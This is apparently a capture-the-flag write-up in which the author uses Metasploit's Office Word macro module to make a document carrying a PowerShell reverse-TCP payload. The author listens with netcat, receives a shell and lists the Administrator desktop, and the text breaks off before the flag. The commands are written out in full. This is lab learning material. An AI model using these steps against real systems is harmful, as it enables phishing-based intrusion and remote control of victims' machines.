This was actually good and fun challenge which made me bang my head at wall multiple times.

Since we need to fit a payload in words file, I asked GPT and gathered knowledge on how to do it. After wasting time and trying wrong method I came to know across a method in msfconsole which makes payload containing word file.

commands:
use exploit/multi/fileformat/office_word_macro
set PAYLOAD payload/windows/powershell_reverse_tcp
set LHOST 10.17.19.178
set LPORT 4444
run


the LHOST here is my OPENVPN connected IP since I am using OPENVPN (tun0 in wsl)
and LPORT is whatever I want to listen to.

after making this payload and submitting it to the victim I opened a port at 4444 and started listening

nc -lvnp 4444 

and I got connection to victim's PC! 


then I searched around and performed
ls C:\Users\Administrator\Desktop\*

and found this 

  Directory: C:\Users\Administrator\Desktop

then I read the flag file and got the
